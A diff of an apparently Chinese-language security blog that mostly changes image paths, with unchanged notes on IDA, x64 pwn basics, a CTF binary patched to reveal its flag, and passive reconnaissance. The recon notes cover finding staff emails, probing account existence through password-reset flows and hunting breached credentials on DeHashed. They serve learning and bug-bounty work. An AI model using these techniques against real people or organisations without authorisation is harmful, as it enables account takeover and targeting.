+<p><img src="/img/rev_Untitled_46.png" alt="Untitled"></p>
 <p>16進位視圖會跟主視圖同步</p>
-<p><img src="img/rev_Untitled_47.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_47.png" alt="Untitled"></p>
 <p>功能視窗</p>
-<p><img src="img/rev_Untitled_48.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_48.png" alt="Untitled"></p>
 <p>IDA如果知道函數功能會有標記像是_fclose、_printf…</p>
 <p>不知道的函數功能會像是 sub_4005BF..</p>
 <p>可以分析後了解作用隨時重新命名</p>
 <p>字串視窗</p>
 <p>View &gt; Open subviews &gt; Strings</p>
-<p><img src="img/rev_Untitled_49.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_49.png" alt="Untitled"></p>
 <p>快捷鍵是shift+F12</p>
 <p>單擊任何一個字串，指引到該程式引用區塊</p>
 <p>Imports</p>
@@ -2300,48 +2533,48 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>了解可執行檔的功能</li>
 <li>透過名稱知道作用</li>
 </ul>
-<p><img src="img/rev_Untitled_50.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_50.png" alt="Untitled"></p>
 <p>Exports</p>
 <ul>
 <li>主要是入口點 start</li>
 </ul>
-<p><img src="img/rev_Untitled_51.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_51.png" alt="Untitled"></p>
 <p>結構 Structures</p>
-<p><img src="img/rev_Untitled_52.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_52.png" alt="Untitled"></p>
 <ul>
 <li>將某種資料結構強加於在內部找到的原始資料</li>
 <li>要建立一個新結構，按fn + insert</li>
 </ul>
-<p><img src="img/rev_Untitled_53.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_54.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_53.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_54.png" alt="Untitled"></p>
 <p>滑鼠點到ends後按 <code>d</code> 會新增一行指令</p>
 <p>再次按d → dword → 4bytes…</p>
 <p>要在建立新的字段一樣到ends後按 <code>d</code></p>
 <p>對欄位取有意義的名稱，按 <code>n</code> ，每個欄位大小Dword → 4bytes,這邊命名x,y,z</p>
-<p><img src="img/rev_Untitled_55.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_56.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_57.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_55.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_56.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_57.png" alt="Untitled"></p>
 <p>發現了一些偏移量，像是結構的一部分，透過按 <code>T</code> 選擇懷疑是結構的位置相符的結構</p>
-<p><img src="img/rev_Untitled_58.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_59.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_58.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_59.png" alt="Untitled"></p>
 <h3 id="保存檔案"><a href="#保存檔案" class="headerlink" title="保存檔案"></a>保存檔案</h3><ul>
 <li>File &gt; Save</li>
 <li>Control + w</li>
 </ul>
 <p>保存後會出現 <code>.i64</code> 檔案，可以將此文件提供給團隊或其他人開啟，並取得你在此專案中所做的相同資料庫和分析</p>
-<p><img src="img/rev_Untitled_60.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_60.png" alt="Untitled"></p>
 <p>建立快照</p>
-<p><img src="img/rev_Untitled_61.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_62.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_61.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_62.png" alt="Untitled"></p>
 <p>要恢復回快照的紀錄，點選快照並按Restore</p>
 <p>每次建立快照會建立一個包含時間和日期的新資料庫</p>
 <p>這也是您可以提供給您的隊友或專案中的任何人的文件</p>
-<p><img src="img/rev_Untitled_63.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_63.png" alt="Untitled"></p>
 <p>如果犯了錯誤想撤銷，按Ctrl+z</p>
 <p>File &gt; close &gt; Pack database (store)</p>
 <p>打包完剩兩個檔案，重新打開項目按 <code>.i64</code></p>
-<p><img src="img/rev_Untitled_64.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_65.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_64.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_65.png" alt="Untitled"></p>
 
       
     </div>
@@ -2405,9 +2638,9 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>取得shell → 輸入指令操作程式</li>
 <li>讀取、竄改檔案 → 讀取敏感或未經授權可讀取的檔案內容</li>
 </ul>
-<p><img src="img/pwn_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/pwn_Untitled.png" alt="Untitled"></p>
 <p>例子:</p>
-<p><img src="img/pwn_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/pwn_Untitled_1.png" alt="Untitled"></p>
 <h3 id="ELF-→-Executable-and-Linkable-Format"><a href="#ELF-→-Executable-and-Linkable-Format" class="headerlink" title="ELF → Executable and Linkable Format"></a>ELF → Executable and Linkable Format</h3><p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/Hy9u21gap">pwn tool install</a></p>
 <p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/BJ_Dpylp6">記憶體區塊</a></p>
 <ul>
@@ -2416,14 +2649,14 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li>用Section區分不同功能資料</li>
 <li><p>程式執行時函數的呼叫就會以 stack frame 的方式層層堆疊，也可以想成記憶體是一個直立式的櫃子、每個函數是一本一本的書籍，裡面記載了這個函數內的各種變數，當一個函數被呼叫時，就把這本書平放到櫃子中書堆的最上面，完成後再從書堆上拿下來。</p>
-<p>  <img src="img/pwn_Untitled_2.png" alt="Untitled"></p>
+<p>  <img src="/img/pwn_Untitled_2.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
 </ul>
-<pre><code>![Untitled](img/pwn_Untitled_3.png)
+<pre><code>![Untitled](/img/pwn_Untitled_3.png)
 
-![Untitled](img/pwn_Untitled_4.png)
+![Untitled](/img/pwn_Untitled_4.png)
 
 - 不同功能需要不同權限、大小
 - 程式碼屬於.text section會需要執行權限
@@ -2437,7 +2670,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
         - 相同權限的資料載入至相同的區塊
         - 被載入到哪塊 virtual memory
 
-    ![Untitled](img/pwn_Untitled_5.png)
+    ![Untitled](/img/pwn_Untitled_5.png)
 
     readelf 是一個可以pass整個elf結構的binary
 
@@ -2490,7 +2723,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 
     checksec 能看執行檔採用的安全防護
 
-    ![Untitled](img/pwn_Untitled_6.png)
+    ![Untitled](/img/pwn_Untitled_6.png)
 
     ### x64 -Basic
 
@@ -2593,7 +2826,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 
     Big/Little Endian
 
-    ![Untitled](img/pwn_Untitled_7.png)
+    ![Untitled](/img/pwn_Untitled_7.png)
 
     ### x64 - Register
 
@@ -2602,7 +2835,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
     - rbp → 指向 stack 底端，基準指針註冊，用於存儲當前函數的堆棧帧基準地址。
     - rip → 下個要執行的instruction位址，指令指針註冊，用於存儲當前執行的指令地址。
 
-    ![Untitled](img/pwn_Untitled_8.png)
+    ![Untitled](/img/pwn_Untitled_8.png)
 
     ### x64 - Calling Convention
 
@@ -2630,7 +2863,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 
         - Caller 與 Callee各自的責任
 
-            ![Untitled](img/pwn_Untitled_9.png)
+            ![Untitled](/img/pwn_Untitled_9.png)
 
             function call是一種程序語言中的語法，**用於調用函數**。函數是程序中的一段可**重複使用的代碼**，**它可以被多個地方調用**。函數可以接受參數，並且可以返回一個結果。他1~6個參數通過register傳遞，超過6個參數就會通過stack傳遞
 
@@ -2652,10 +2885,10 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
             - 在 x86–64 結構下，暫存器都是 64 bits = 8 bytes 大小[[5]](https://tech-blog.cymetrics.io/posts/crystal/reverse-01/#fn5)
             ，暫存器也可以部分存取，以 `rax` 為例，`eax` 指 `rax` 的後 4 bytes、再對切得到 `ax` 為倒數 2 bytes、然後再切分為 `ah` 與 `al`。
 
-            ![Untitled](img/pwn_Untitled_10.png)
+            ![Untitled](/img/pwn_Untitled_10.png)
 
-            ![Untitled](img/pwn_Untitled_11.png)
-</code></pre><h3 id="x64-function-frame"><a href="#x64-function-frame" class="headerlink" title="x64 - function frame"></a>x64 - function frame</h3><p><img src="img/pwn_Untitled_12.png" alt="Untitled"></p>
+            ![Untitled](/img/pwn_Untitled_11.png)
+</code></pre><h3 id="x64-function-frame"><a href="#x64-function-frame" class="headerlink" title="x64 - function frame"></a>x64 - function frame</h3><p><img src="/img/pwn_Untitled_12.png" alt="Untitled"></p>
 <ul>
 <li>每個Function 在執行期間，stack中會有一塊空間負責記錄當前function的執行狀態，而該空間稱為Function frame，保存的狀態像是:<ul>
 <li>當前function使用的變數</li>
@@ -2701,8 +2934,8 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <p>  rip → 下條要執行的指令</p>
 </li>
 </ul>
-<p><img src="img/pwn_Untitled_13.png" alt="Untitled"></p>
-<p><img src="img/pwn_x86_exec.drawio.png" alt="x86 exec.drawio.png"></p>
+<p><img src="/img/pwn_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/pwn_x86_exec.drawio.png" alt="x86 exec.drawio.png"></p>
 <h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><ul>
 <li>Explanation - 指攻擊者可以透過程式漏洞，將能控制到的data以指令的方式來執行<ul>
 <li>Binary 為一連串的assembly instruction 組合而成，如果攻擊者可以再擁有<strong>執行+寫入</strong>權限的區段寫入一連串的instruction，控制執行流程到該區塊時<strong>就能執行shellcode</strong></li>
@@ -2710,7 +2943,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 </li>
 <li>Precondition - 能控制到區塊的權限必須為rwx or -wx 才可寫入並執行</li>
 </ul>
-<p><img src="img/pwn_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/pwn_Untitled_14.png" alt="Untitled"></p>
 <ul>
 <li>安裝pwntool</li>
 <li>圖一中 asm是Python中的一個模塊，它可以將AT&amp;T格式的汇编語言代碼轉換為機器碼。這個模塊可以方便地在Python程序中使用汇编語言。</li>
@@ -2757,7 +2990,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li>在gef的stack區塊看到+0x0000、+0x0008…+0x0038的資訊</li>
 <li><p>想往後看記憶體位置時，因當前沒有看到想看到的位址資訊</p>
-<p>  <img src="img/pwn_Untitled_15.png" alt="Untitled"></p>
+<p>  <img src="/img/pwn_Untitled_15.png" alt="Untitled"></p>
 </li>
 <li><p>最後一行是+0x0038</p>
 <ul>
@@ -2789,7 +3022,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ulong uVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_7c;</span><br><span class="line">  <span class="type">int</span> local_78;</span><br><span class="line">  <span class="type">int</span> local_74;</span><br><span class="line">  uint local_70;</span><br><span class="line">  <span class="type">int</span> local_6c;</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  undefined8 local_60;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined4 local_50;</span><br><span class="line">  undefined2 local_4c;</span><br><span class="line">  undefined local_4a;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined2 local_18;</span><br><span class="line">  undefined local_16;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_68 = <span class="number">0x756f795f65766148</span>;</span><br><span class="line">  local_60 = <span class="number">0x65685f726576655f</span>;</span><br><span class="line">  local_58 = <span class="number">0x756f62615f647261</span>;</span><br><span class="line">  local_50 = <span class="number">0x64675f74</span>;</span><br><span class="line">  local_4c = <span class="number">0x3f62</span>;</span><br><span class="line">  local_4a = <span class="number">0</span>;</span><br><span class="line">  local_48 = <span class="number">0x100b021e37252806</span>;</span><br><span class="line">  local_40 = <span class="number">0x54372d170211103d</span>;</span><br><span class="line">  local_38 = <span class="number">0x25f123e30172d12</span>;</span><br><span class="line">  local_30 = <span class="number">0x2631600e11012d11</span>;</span><br><span class="line">  local_28 = <span class="number">0x3c44024d311c123e</span>;</span><br><span class="line">  local_20 = <span class="number">0x8361133460b423a</span>;</span><br><span class="line">  local_18 = <span class="number">0x1901</span>;</span><br><span class="line">  local_16 = <span class="number">0x5f</span>;</span><br><span class="line">  local_6c = open(<span class="string">&quot;/dev/urandom&quot;</span>,<span class="number">0</span>);</span><br><span class="line">  read(local_6c,&amp;local_7c,<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me maigc :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00402021,&amp;local_78);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">    local_74 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                         *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">      local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">      uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">      uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-![Untitled](img/pwn_Untitled_16.png)
+![Untitled](/img/pwn_Untitled_16.png)
 
 右鍵點Patch instruction 修改JNZ→JZ，該區塊程式就會變成如果相等就直接執行 puts(&quot;Nope~&quot;); 再另外儲存成ELF，重新執行該檔案
 
@@ -2802,23 +3035,23 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 - b *0x0000000000401325
 - r
 
-![Untitled](img/pwn_Untitled_17.png)
+![Untitled](/img/pwn_Untitled_17.png)
 
-![Untitled](img/pwn_Untitled_18.png)
+![Untitled](/img/pwn_Untitled_18.png)
 
 前面原始碼有看到，相同才會並執行到這裡面的命令
 
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">   local_74 = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">     <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                        *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">     local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">     uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">     uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">     local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 
-![Untitled](img/pwn_Untitled_19.png)
+![Untitled](/img/pwn_Untitled_19.png)
 
 把eax，edx給輸出出來兩個數值並不同，所以這裡把edx給改成0就可以相同了
 
-![Untitled](img/pwn_Untitled_20.png)
+![Untitled](/img/pwn_Untitled_20.png)
 
 最後改好再執行
 
-![Untitled](img/pwn_Untitled_21.png)
+![Untitled](/img/pwn_Untitled_21.png)
 </code></pre>
       
     </div>
@@ -3254,18 +3487,18 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>根據錯誤提交給該組織可以獲取一定的收入</li>
 <li>找到目標 example: Tesla</li>
 </ul>
-<p><img src="img/passive_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled.png" alt="Untitled"></p>
 <ul>
 <li>攻擊前，要確認該目標還有bug bounty</li>
 <li>其中有些不一定會給獎金，可能是積分或是名譽</li>
 <li>閱讀目標訊息、規則</li>
 </ul>
-<p><img src="img/passive_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_1.png" alt="Untitled"></p>
 <ul>
 <li>在範圍內進行測試不要超出範圍</li>
 </ul>
-<p><img src="img/passive_Untitled_2.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_3.png" alt="Untitled"></p>
 <h3 id="Discovering-Email-Addresses"><a href="#Discovering-Email-Addresses" class="headerlink" title="Discovering Email Addresses"></a><strong>Discovering Email Addresses</strong></h3><ul>
 <li>查找電子郵件地址並嘗試尋找目標人員</li>
 <li>我要尋找銷售、我要向誰發送郵件</li>
@@ -3275,14 +3508,14 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li><a target="_blank" rel="noopener" href="https://hunter.io/search">hunter.io</a></li>
 <li><p>每個月50~100次免費搜索</p>
-<p><img src="img/passive_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_4.png" alt="Untitled"></p>
 </li>
 <li><p>可以在這裡搜尋目標郵件</p>
 <ul>
 <li><p>特定人員、部門、公司郵件…</p>
-<p><img src="img/passive_Untitled_5.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_6.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_5.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_7.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -3294,12 +3527,12 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 </ul>
 </li>
 </ul>
-<p><img src="img/passive_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_8.png" alt="Untitled"></p>
 <ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.voilanorbert.com/">vilanorbert.com</a></p>
 <ul>
 <li><p>免費50條線索</p>
-<p>  <img src="img/passive_Untitled_9.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_9.png" alt="Untitled"></p>
 </li>
 <li><p>找到目標人員</p>
 </li>
@@ -3313,16 +3546,16 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>設定並儲存您的理想客戶檔案 (ICP)</li>
 <li>可以將網域新增至「封鎖清單」</li>
 <li><p>找到特定組織人員，並連繫LinkedIn</p>
-<p><img src="img/passive_Untitled_10.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_11.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_12.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://tools.emailhippo.com/">https://tools.emailhippo.com/</a></p>
 <ul>
 <li><p>找到某人，並發現有淺在電子郵件地址，到這網站驗證該郵件地址是否真實存在</p>
-<p><img src="img/passive_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_13.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -3331,8 +3564,8 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li><p><a target="_blank" rel="noopener" href="https://email-checker.net/">email-checker.net</a></p>
 <ul>
 <li><p>檢查郵件是否存在</p>
-<p><img src="img/passive_Untitled_14.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_15.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_15.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -3340,10 +3573,10 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li>搜尋帳戶是否存在 &gt; 成功進到密碼輸入 &gt;確認帳戶存在</li>
 <li><p>點擊忘記密碼 &gt; 嘗試其他方式 &gt; 猜測傳送驗證碼的目標位置 &gt; 確認對方身分</p>
-<p><img src="img/passive_Untitled_16.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_17.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_18.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_19.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_16.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_17.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_18.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_19.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -3356,28 +3589,28 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li><p>下載好後運行</p>
 </li>
 </ul>
-<p><img src="img/passive_Untitled_20.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_21.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_20.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_21.png" alt="Untitled"></p>
 <h3 id="Hunting-Breached-Credentials-with-DeHashed"><a href="#Hunting-Breached-Credentials-with-DeHashed" class="headerlink" title="Hunting Breached Credentials with DeHashed"></a><strong>Hunting Breached Credentials with DeHashed</strong></h3><ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.dehashed.com/">DEHASHED</a></p>
 <ul>
 <li><p>通過電子郵件、用戶名、IP地址、姓名、電話號碼..進行搜索</p>
-<p>  <img src="img/passive_Untitled_22.png" alt="Untitled"></p>
-<p>  <img src="img/passive_Untitled_23.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_22.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_23.png" alt="Untitled"></p>
 </li>
 <li><p>有些帳號的密碼是Hash &gt; 搜索該Hash還有很多不同帳號一樣</p>
 </li>
 </ul>
 </li>
 </ul>
-<p><img src="img/passive_Untitled_24.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_25.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_24.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_25.png" alt="Untitled"></p>
 <ul>
 <li>搜索<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">hashes.org</a> &gt; 查找目標Hash &gt; 如果有搜索到就會顯示破解結果</li>
 <li>或是通過Google直接搜索該Hash是否有相關資料</li>
 </ul>
-<p><img src="img/passive_Untitled_26.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_27.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_26.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_27.png" alt="Untitled"></p>
 <h3 id="Hunting-Subdomains-Part-1"><a href="#Hunting-Subdomains-Part-1" class="headerlink" title="Hunting Subdomains Part 1"></a><strong>Hunting Subdomains Part 1</strong></h3><p> 外部或內部進行滲透測試時遇到一個網站，能夠蒐集該網站訊息，或是在網站上進行一些操作</p>
 <p>在攻擊前，需要確認有哪些子域、攻擊範圍</p>
 <ul>
@@ -3395,8 +3628,8 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li><p>尋找已註冊證書</p>
 <ul>
 <li><p>Google Search <a target="_blank" rel="noopener" href="https://crt.sh/">Crt.sh</a></p>
-<p><img src="img/passive_Untitled_28.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_29.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_28.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_29.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -3419,12 +3652,12 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>透過版本查找漏洞</li>
 <li><a target="_blank" rel="noopener" href="https://builtwith.com/">https://builtwith.com/</a></li>
 </ul>
-<p><img src="img/passive_Untitled_30.png" alt="Untitled"></p>
-<p><img src="img/passive_Untitled_31.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_30.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_31.png" alt="Untitled"></p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-TW">wappalyer</a></li>
 </ul>
-<p><img src="img/passive_Untitled_32.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_32.png" alt="Untitled"></p>
 <ul>
 <li>whatweb 查看更多網站資訊</li>
 </ul>
@@ -3433,16 +3666,16 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li><p>Burp Suite</p>
 <ul>
 <li><p>先去設定FireFox &gt; 側欄找到setting &gt; General &gt; 滑到最底下的Network Proxy&gt;Settings</p>
-<p>  <img src="img/passive_Untitled_33.png" alt="Untitled"></p>
-<p>  <img src="img/passive_Untitled_34.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_33.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_34.png" alt="Untitled"></p>
 </li>
 <li><p>再瀏覽器搜尋<a target="_blank" rel="noopener" href="https://burp/">https://burp/</a> &gt; 點擊CA Certificate</p>
-<p><img src="img/passive_Untitled_35.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_35.png" alt="Untitled"></p>
 </li>
 <li><p>回到FireFox Setting &gt; Privacy &amp; Security &gt; Security &gt; View Certificate &gt; Import cacert.der &gt; 兩選項都打勾</p>
 </li>
 <li><p>開啟Burp Suite <code>Intercept is on</code> &gt;搜索目標網站&gt;Burp Suite會顯示該網站資訊</p>
-<p>  <img src="img/passive_Untitled_36.png" alt="Untitled"></p>
+<p>  <img src="/img/passive_Untitled_36.png" alt="Untitled"></p>
 </li>
 <li><p>可以按Forward繼續看到網頁內容，並擷取到其他頁面資訊</p>
 </li>
@@ -3451,15 +3684,15 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>當前已載入過的頁面</li>
 <li>攔截的流量</li>
 <li><p>當下點擊目標頁面中的其他連結也會即時刷新此處資訊</p>
-<p><img src="img/passive_Untitled_37.png" alt="Untitled"></p>
+<p><img src="/img/passive_Untitled_37.png" alt="Untitled"></p>
 </li>
 <li><p>Response 會看到更多詳盡資訊</p>
-<p><img src="img/passive_Untitled_38.png" alt="Untitled"></p>
